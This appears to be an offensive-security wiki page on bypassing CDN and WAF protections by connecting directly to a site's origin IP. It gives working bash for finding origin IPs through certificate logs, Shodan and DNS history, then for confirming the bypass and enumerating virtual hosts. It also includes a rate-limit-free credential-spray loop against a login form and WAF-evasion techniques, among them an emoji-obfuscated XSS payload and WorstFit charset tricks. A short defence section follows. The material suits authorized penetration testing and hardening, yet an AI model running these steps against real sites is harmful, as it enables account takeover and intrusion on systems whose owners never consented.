---
title: "CDN/WAF Bypass via Direct Origin IP"
type: technique
tags: [origin-ip, rate-limit-bypass, recon, waf-bypass, web]
phase: recon
date_created: 2026-05-21
date_updated: 2026-07-15
sources: [claroty-json-waf, orange-worstfit-defcon2024, hacktricks-web]
---

# CDN/WAF Bypass via Direct Origin IP

## What it is

A CDN (Content Delivery Network) such as Cloudflare, Akamai, or Fastly acts as a reverse proxy, intercepting all traffic and applying WAF rules, rate limiting, and IP blocking before forwarding legitimate requests to the origin server. If the origin server's IP is known and accepts direct TCP connections from the internet, all CDN protections are bypassed entirely.

## How it works

The CDN proxies requests; only the CDN sees the client IP. The origin sees only the CDN's IP ranges as incoming. If the origin does not enforce source IP restrictions (allow only CDN IP ranges), an attacker who knows the origin IP can send an HTTP request directly with a `Host` header matching the target domain. The origin serves the response normally. All WAF rules, rate limiting, JS challenges, Bot Fight Mode, and IP blocklists on the CDN are completely ineffective.

## Attack phases

Recon (origin IP discovery), then exploitation (unrestricted attack delivery).

## Prerequisites

- The target application is CDN-proxied
- The origin server accepts inbound connections from the internet (port 80/443 open to all source IPs)

## Methodology

### 1. Discover the origin IP

Use multiple passive methods in parallel; origin IPs are rarely discoverable via a single source.

**SSL certificate history (most reliable):**

```bash
# crt.sh: passive TLS certificate transparency log search
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  python3 -c "
import json, sys
certs = json.load(sys.stdin)
names = set()
for c in certs:
    names.update(c.get('name_value','').split('\n'))
for n in sorted(names): print(n)
"

# Censys: historical IPs for the certificate subject
# (requires free account)
curl -s "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.subject.common_name%3Atarget.com" \
  -H "Authorization: Basic $(echo -n 'API_ID:API_SECRET' | base64)"
```

**Shodan: scan results filtered to exclude CDN IP ranges**

```bash
# Cloudflare IP ranges (exclude these): 104.16.0.0/12, 172.64.0.0/13, 141.101.64.0/18, 188.114.96.0/20
shodan search "ssl:target.com" --fields ip_str,port,org | \
  grep -vP "^(104\.(1[6-9]|[2-9]\d|1[0-5]\d)\.|172\.(6[4-9]|[7-9]\d)\.|141\.101\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.|188\.114\.(9[6-9]|1[01]\d|12[0-7])\.)"
```

**Subdomain DNS: non-CDN subdomains often resolve directly**

```bash
# Enumerate all subdomains first (crt.sh, subfinder, amass)
# Then check which ones resolve to non-CDN IPs
while read sub; do
    ip=$(dig +short "$sub" 2>/dev/null | grep -P '^\d+\.\d+\.\d+\.\d+$' | tail -1)
    [ -z "$ip" ] && continue
    # Check if IP is in Cloudflare ranges (simplified)
    if ! echo "$ip" | grep -qP '^(104\.(1[6-9]|[2-9]\d|1[0-5]\d)\.|172\.(6[4-9]|[7-9]\d)\.|141\.101\.|188\.114\.)'; then
        echo "$sub -> $ip (DIRECT)"
    fi
done < subdomains.txt
```

Common candidates for direct origin resolution: `mail.`, `smtp.`, `ftp.`, `dev.`, `staging.`, `api.`, `vpn.`, `jenkins.`, `jira.`.

**Debug response headers: origin leaking its own routing**

```bash
# Some reverse proxies and app servers emit debug headers revealing internal routing
curl -sI "https://target.com/" | grep -iP "^(x-debug|x-backend|x-upstream|x-real-ip|x-forwarded-server|via|x-served-by)"

# These headers sometimes pass through the CDN unmodified
# x-debug-backend-host: internal.target.com
# x-upstream: 10.0.0.42
```

**Email headers: transactional emails contain sending IP**

```bash
# Trigger a password reset or registration confirmation email
# View raw headers in the email client: look for "Received:" lines
# The sending SMTP server IP is often the same /24 as the web origin
```

**Historical DNS (ViewDNS, SecurityTrails):**

Many targets moved to Cloudflare recently; their previous A record (the origin IP) is often still live.

```bash
# SecurityTrails API (free tier available)
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "apikey: YOUR_KEY" | python3 -c "
import json, sys
d = json.load(sys.stdin)
for r in d.get('records', []):
    for v in r.get('values', []):
        print(r['first_seen'], '->', r['last_seen'], ':', v['ip'])
"
```

### 2. Verify the bypass

```bash
ORIGIN_IP="1.2.3.4"
TARGET="target.com"

# Method A: direct connection with Host header swap
curl -sk -I -H "Host: $TARGET" "https://$ORIGIN_IP/" 2>&1 | head -15

# Method B: --resolve (preserves SNI for TLS certificate matching)
curl -sk -I --resolve "$TARGET:443:$ORIGIN_IP" "https://$TARGET/" 2>&1 | head -15
```

**You have a confirmed bypass if:**

- No `CF-Ray:` header in the response (Cloudflare always adds this)
- No `x-cache:` header from Fastly/Akamai
- `Server:` shows the origin stack (e.g., `nginx/1.24.0`, `Apache`, `IIS`)
- Response differs from what you get via the CDN (e.g., different error page, different headers)

```bash
# Negative example -- legitimate CDN-fronted response:
# CF-Ray: 89abcdef01234-LHR
# Server: cloudflare

# Positive example -- origin reached directly:
# Server: nginx/1.24.0 (Ubuntu)
# (no CF-Ray header)
```

### 3. Enumerate virtual hosts at the origin

A single origin IP typically serves multiple virtual hosts. The `x-debug-backend-host` or similar header (if present) reveals internal routing; otherwise enumerate using known subdomains and a wildcard TLS certificate.

```bash
# Try all known subdomains against the origin IP
while read sub; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Host: $sub" "https://$ORIGIN_IP/")
    echo "$sub -> $code"
done < subdomains.txt

# Check wildcard TLS cert SAN for subdomain enumeration
echo | openssl s_client -connect "$ORIGIN_IP:443" -servername "$TARGET" 2>/dev/null | \
  openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
```

### 4. Secondary deployments without any CDN

A common pattern: the primary production domain is CDN-fronted, but a secondary deployment (staging, EU brand domain, legacy domain, or a parallel deployment for a different region) resolves directly to an origin with no CDN at all. This is not a bypass; there is simply nothing to bypass.

```bash
# For each subdomain and related domain you discover, check for CF-Ray
for sub in staging dev eu uk app api; do
    result=$(curl -sk -o /dev/null -w "%{http_code}" -D - "https://$sub.target.com/" 2>/dev/null | grep -c "CF-Ray")
    echo "$sub.target.com: CF-Ray present=$result"
done

# Check brand/country domains separately
# e.g., target.eu, target.co.uk, target-staging.com
dig +short target.eu   # If resolves to non-CF IP: direct access, no bypass needed
```

### 5. Exploitation impact once bypass is confirmed

**Unrestricted credential spray:**

```bash
# Spray at full speed with no rate limiting or IP blocking
# Get CSRF token first if required
CSRF=$(curl -sk -c /tmp/jar.txt -H "Host: $TARGET" "https://$ORIGIN_IP/login" | \
  grep -oP 'csrf[_-]?token["\s]+value="?\K[^">\s]+')

# Spray
for PASS in $(cat passwords.txt); do
  CODE=$(curl -sk -b /tmp/jar.txt -c /tmp/jar.txt -X POST \
    -H "Host: $TARGET" "https://$ORIGIN_IP/login" \
    -d "username=admin&password=$PASS&csrf_token=$CSRF" \
    -o /dev/null -w "%{http_code}")
  [ "$CODE" != "401" ] && [ "$CODE" != "403" ] && echo "HIT: $PASS ($CODE)" && break
done
```

**Direct access to admin/staging vhosts blocked at CDN:**

```bash
# Admin panels often have Cloudflare Page Rules blocking non-whitelisted IPs
# At origin, no such rule exists
curl -sk -H "Host: admin.$TARGET" "https://$ORIGIN_IP/admin/" | head -50

# Staging environments with weaker credentials
curl -sk -H "Host: staging.$TARGET" "https://$ORIGIN_IP/" | head -50
```

**Source map files blocked by CDN WAF rule but served at origin:**

```bash
# Map requests blocked via CDN WAF rule: 403
curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/main.abc123.js.map"
# 403 -- blocked by WAF

# Same request directly to origin
curl -sk -o /dev/null -w "%{http_code}" -H "Host: $TARGET" "https://$ORIGIN_IP/main.abc123.js.map"
# 200 -- served without restriction
```

## Payload-level WAF evasion (when you cannot reach the origin)

When the origin is locked to CDN ranges, evade the WAF ruleset itself by obfuscating the payload so the WAF does not recognise it but the backend still parses it. Always confirm the backend actually executes the obfuscated payload, not just that the WAF returned 200.

- JSON-based SQLi bypass (Claroty, 2022): many WAFs do not parse SQL inside JSON syntax. Wrap the injection using JSON operators/functions the database accepts (PostgreSQL/MySQL/MSSQL JSON support) but the WAF mis-parses.
- Encoding and charset: mixed or over-long URL-encoding, unicode normalisation, and `charset=` switches so the WAF and app decode differently.
- Parameter and HTTP pollution: duplicate parameters and query-vs-body precedence differences (see [[hpp-attacks]]).
- Content-type confusion: send a `Content-Type` the WAF skips but the framework still binds.
- Inline comments / case / whitespace for SQLi and XSS: `/*!50000UNION*/`, `uNiOn`, tab/newline separators, comment splitting.

### WorstFit / Best-Fit charset abuse (Orange Tsai, DEF CON 2024)

Windows "Best-Fit" charset conversion (ANSI codepage / `WideCharToMultiByte`) silently maps non-ASCII Unicode characters to lookalike ASCII when a wide string is narrowed. A filter/WAF/validator sees a harmless Unicode char; after conversion the backend (PHP on Windows, `argv` parsing, file APIs) sees the dangerous ASCII char. Bypasses path-traversal, argument-injection, and quote/metachar filters without ever sending the literal blocked byte.

```
fullwidth quote  U+FF02  ＂  -> "      (argument injection / break out of quoted arg)
fullwidth dot    U+FF0E  ．  -> .      (path traversal: ．．／ -> ../)
fullwidth slash  U+FF0F  ／  -> /
yen sign         U+00A5  ¥   -> \      (Windows path separator, Shift-JIS codepage)
overline         U+203E  ‾   -> ~      (8.3 short-name access)
```

Use when input is reflected into: a Windows process command line, a filename/path API, or a PHP-on-Windows function. The filter matches on ASCII it never receives. Confirm the backend actually performed the conversion (the lookalike reached a sink as plain ASCII). Related argument-injection note in [[os-command-injection]].

See [[sql-injection]], [[xss]], [[hpp-attacks]], [[path-traversal-lfi]].

### Unicode `\u`-to-`%` and encoding-conversion mismatch

Two normalization gadgets distinct from Best-Fit above:

- **`\u` -> `%` transform:** some backends rewrite the `\u` prefix of a unicode escape into `%`. Pick a codepoint whose hex tail decodes to the metacharacter you want. A `<` handled naively can surface as `%3c` and then URL-decode to `<`, injecting the tag byte past a filter that never saw a literal `<`. Generalize by choosing codepoints whose last bytes map to `<`, `"`, `'`, `/`, etc.
- **Encoding-conversion mismatch (double-transcode):** when a service strips dangerous chars, then converts encodings in the wrong order (e.g. `iconv("Windows-1252","UTF-8")` followed by `iconv("UTF-8","ASCII//TRANSLIT")`), a benign non-ASCII lookalike gets normalized back into the dangerous ASCII char AFTER the filter ran. Emoji/confusable payloads survive the blacklist and re-materialize as `<`:

```
# lands after the sanitizer, transliterates to < on a mismatched pipeline
💋img src=x onerror=alert(document.domain)//💛
```

Method: identify where input is validated versus where it is normalized/case-folded/transcoded; inject a unicode char that is safe at validation time but collapses to the attack byte at the later step. Use unicode-explorer / worst.fit mapping tables to pick codepoints.

## Bypasses and variants

- **Origin requires Cloudflare IP in X-Forwarded-For**: some origins validate that the XFF header contains a Cloudflare IP; add `-H "X-Forwarded-For: 104.16.0.1"` to bypass this check
- **mTLS (Authenticated Origin Pulls)**: Cloudflare's Authenticated Origin Pulls feature makes the origin require a specific client certificate on the TLS connection; this cannot be bypassed without the certificate
- **Firewall allows only Cloudflare IP ranges**: if the origin correctly restricts connections to CDN IP ranges, direct IP access will time out or be refused

## Detection and defence

- Restrict the origin server (nginx, Apache, AWS Security Group, GCP firewall rule) to accept connections only from the CDN's published IP ranges
- For Cloudflare: enable Authenticated Origin Pulls (mTLS between Cloudflare and origin); this is the only reliable mitigation
- Apply identical WAF rules and access controls to all deployments including staging, EU domains, and legacy brand domains, not only the primary production domain
- Remove all debug headers (`x-debug-backend-host`, `x-upstream`, `x-backend-server`) from origin responses
- Use `dig +short` against all owned domains regularly to detect any that have drifted off the CDN

## Tools

- `curl`, `dig`: origin IP verification and virtual host enumeration
- Shodan, Censys, crt.sh, SecurityTrails, ViewDNS: passive origin IP discovery
- [[ffuf]]: virtual host fuzzing at origin IP with `-H "Host: FUZZ.target.com"`

## Sources

- Generalised from real engagement findings
- HackTricks (pentesting-web) - `\u`-to-`%` and encoding-conversion mismatch (slug: hacktricks-web)
